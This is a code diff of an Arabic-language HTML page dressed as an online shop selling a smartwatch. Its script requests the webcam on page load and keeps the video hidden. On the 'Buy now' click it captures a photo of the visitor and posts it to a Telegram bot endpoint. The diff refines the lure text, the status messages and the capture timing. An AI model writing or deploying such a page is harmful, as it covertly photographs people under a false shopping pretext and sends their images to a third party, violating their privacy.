@@ -1,28 +1,61 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>متجر إلكتروني</title>
   <style>
-    body { font-family: Tahoma; text-align: center; background: #f4f4f4; margin: 0; padding: 0; }
-    header { background: #2c3e50; color: white; padding: 15px; font-size: 22px; }
-    .product { background: white; margin: 20px auto; padding: 15px; border-radius: 8px; width: 300px; }
-    .btn { background: #27ae60; color: white; padding: 10px 15px; text-decoration: none; border-radius: 5px; font-size: 18px; display: inline-block; }
-    .btn:hover { background: #2ecc71; }
-    #status { margin-top: 15px; font-weight: bold; }
-    video, canvas { display: none; }
+    body {
+      font-family: Tahoma;
+      text-align: center;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background: #2c3e50;
+      color: white;
+      padding: 15px;
+      font-size: 22px;
+    }
+    .product {
+      background: white;
+      margin: 20px auto;
+      padding: 15px;
+      border-radius: 8px;
+      width: 300px;
+    }
+    .btn {
+      background: #27ae60;
+      color: white;
+      padding: 10px 15px;
+      text-decoration: none;
+      border-radius: 5px;
+      font-size: 18px;
+      display: inline-block;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background: #2ecc71;
+    }
+    #status {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
   <header>متجر خالد</header>
   <div class="product">
-    <h2></h2>
-    <pاص</p>
-    <a href="#" id="buy" class="btn">هديه</a>
+    <h2>ساعة ذكية</h2>
+    <p>أفضل جودة - سعر خاص</p>
+    <button id="buy" class="btn">اشترِ الآن</button>
     <p id="status"></p>
   </div>
 
-  <video id="video" autoplay></video>
+  <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="320" height="240"></canvas>
 
   <script>
@@ -33,43 +66,47 @@
     const canvas = document.getElementById('canvas');
     const statusText = document.getElementById('status');
 
-    // طلب إذن الكاميرا أول ما يفتح الصفحة
+    // طلب إذن الكاميرا عند دخول الصفحة
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
+        statusText.textContent = "✅ الكاميرا شغالة، تقدر تضغط اشترِ الآن";
       })
       .catch(err => {
-        statusText.textContent = "";
+        statusText.textContent = "⚠️ لم يتم السماح بالكاميرا: " + err.message;
       });
 
-    // عند الضغط على "اشتر الآن" نرسل الصورة
     document.getElementById('buy').addEventListener('click', (e) => {
       e.preventDefault();
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      statusText.textContent = "⏳ جاري التقاط الصورة وإرسالها...";
+      setTimeout(() => {
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = "#fff"; // خلفية بيضاء
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'photo.png');
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', blob, 'photo.png');
 
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => {
-          if (response.ok) {
-            statusText.textContent = "✅ تم تسجيل طلبك (الصورة أُرسلت)";
-          } else {
-            statusText.textContent = "❌ فشل الإرسال";
-          }
-        })
-        .catch(err => {
-          statusText.textContent = "❌ خطأ: " + err;
-        });
-      }, 'image/png');
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          })
+          .then(response => {
+            if (response.ok) {
+              statusText.textContent = "✅ تم تسجيل طلبك (الصورة أُرسلت)";
+            } else {
+              statusText.textContent = "❌ فشل الإرسال";
+            }
+          })
+          .catch(err => {
+            statusText.textContent = "❌ خطأ: " + err.message;
+          });
+        }, 'image/png');
+      }, 1000); // تأخير 1 ثانية عشان الفيديو يشتغل
     });
   </script>
 </body>
-</html>
 </html>
